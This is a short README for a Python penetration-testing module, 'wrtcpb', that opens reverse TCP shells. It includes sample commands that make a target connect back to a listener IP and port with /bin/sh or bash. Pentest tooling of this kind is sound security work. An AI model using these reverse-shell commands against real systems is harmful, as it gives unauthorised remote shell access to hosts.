#### Use case ####
    Used for penetration testing.
    The main reason I created this module, was so that I could easily
    and quickly initiate multiple reverse TCP connections.

    More often than not, I connect via three different ports when hacking,
    and I would rather not keep performing "sed"/"ed", or opening vim/nano or
    using powershell commands in order to switch the ports, or inital shell.

#### Sample module wrtcpb - Iniitate reverseTCP ####
    Straight forward.
    python wrtcpb.py -lh 10.10.14.16 -lp 4443 -c /bin/sh
    python wrtcpb.py -lh 10.10.14.16 -lp 4442 -c bash
    ./wrtcpb.py -lh 10.10.14.16

##### _All modules have a -h and --help for more assistance._ #####